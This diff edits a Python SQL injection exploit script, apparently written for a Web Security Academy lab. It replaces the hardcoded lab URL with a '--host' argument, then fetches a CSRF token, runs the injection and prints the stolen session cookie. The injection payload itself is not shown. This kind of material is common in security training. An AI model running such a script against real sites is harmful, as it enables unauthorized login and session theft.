@@ -2,17 +2,11 @@
 
 import requests
 from bs4 import BeautifulSoup
+import argparse
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-target_url = "https://0a7600650308ca60c0bb2fe200a600c1.web-security-academy.net"
-
-r = requests.Session()
-proxies = {
-    'https':'http://127.0.0.1:8080',
-    'http':'http://127.0.0.1:8080'
-}
-
+# Get CSRF token
 def get_csrf_token():
     url = target_url + "/login"
 
@@ -42,5 +36,18 @@ def sql_injection(csrf_token):
         print("[+] Exploited")
         print("[+] Session Cookies is: ", session_cookie)
 
-csrf_token = get_csrf_token()
-sql_injection(csrf_token)
+if __name__ == "__main__":
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host', type=str, required=True)
+    args = parser.parse_args()
+
+    r = requests.Session()
+    target_url = args.host
+    proxies = {
+        'https':'http://127.0.0.1:8080',
+        'http':'http://127.0.0.1:8080'
+    }
+    
+    csrf_token = get_csrf_token()
+    sql_injection(csrf_token)
